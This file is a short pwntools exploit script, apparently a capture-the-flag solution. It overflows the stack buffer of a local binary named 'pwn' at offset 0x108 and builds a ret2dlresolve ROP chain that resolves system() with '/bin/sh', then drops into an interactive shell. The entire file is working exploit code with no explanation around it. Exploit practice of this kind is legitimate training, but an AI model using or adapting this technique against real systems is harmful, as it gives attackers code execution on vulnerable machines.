from pwn import *

context(log_level='debug', os='linux', arch='amd64') # 必须指明架构！！！

p = process('./pwn')
elf = ELF('./pwn')

offset = 0x108

dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh\x00'])

rop = ROP(elf)
rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)

payload = b'a' * offset + rop.chain()
p.send(payload)
p.send(dlresolve.payload)
print(rop.dump())

p.interactive()